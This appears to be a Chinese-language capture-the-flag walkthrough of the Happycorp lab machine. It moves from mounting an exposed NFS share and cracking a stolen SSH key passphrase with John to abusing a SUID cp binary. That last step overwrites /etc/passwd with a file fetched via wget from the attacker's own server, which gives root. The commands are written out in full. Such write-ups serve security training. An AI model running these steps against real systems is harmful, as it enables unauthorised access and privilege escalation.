# Happycorp 实战小记

## 服务扫描

服务扫描结果如下

![[Pasted image 20250614220220.png]]

80 端口没有有价值的发现，发现开放 nfs 共享文件

## nfs 共享文件

发现并挂载共享文件夹

```
showmount -e 10.10.10.13

mkdir attact

sudo mount -t nfs 10.10.10.13:/home/karl attact
```

![[Pasted image 20250622143529.png]]

复制进来的文件需要 id = 1001 的用户进行访问，创建一个用户进行访问

```
sudo useradd --uid 1001 attact

sudo passwd attact

su attact
```

![[Pasted image 20250622144000.png]]

复制 id_rsa 进行破解

![[Pasted image 20250622144237.png]]

![[Pasted image 20250622144341.png]]

```
sudo /usr/share/john/ssh2john.py id_rsa > crack.txt

sudo john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250622144956.png]]

## Linux 提权

id_rsa 连接 ssh

```
ssh -i /tmp/.ssh/id_rsa karl@10.10.10.13 -t /bin/sh 
```

![[Pasted image 20250622145937.png]]

查找 s 位执行文件发现可以使用 cp

```
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20250622150122.png]]

将靶机的 passwd 复制到本地，添加一个新的用户 attact 进去

![[Pasted image 20250622150403.png]]

用 python3 搭建一个本地服务器，将 passwd 下载进靶机

```
python3 -m http.server

wget http://10.10.10.5:8000/passwd

cp passwd /etc/passwd

su attact
```

切换到 root